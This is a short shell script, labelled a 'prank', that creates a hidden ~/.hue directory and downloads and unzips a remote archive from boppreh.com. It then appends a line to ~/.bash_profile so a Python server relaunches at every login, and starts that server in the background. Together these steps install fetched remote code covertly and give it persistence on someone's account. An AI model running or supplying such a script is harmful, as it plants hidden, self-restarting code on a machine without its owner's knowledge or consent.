mkdir -p ~/.hue
cd ~/.hue
wget http://boppreh.com/prank/deploy.zip
unzip deploy.zip
chmod +x deploy/espeak
echo -e "\n\npython ~/.hue/deploy/hue_server.py" >> ~/.bash_profile
python ~/.hue/deploy/hue_server.py &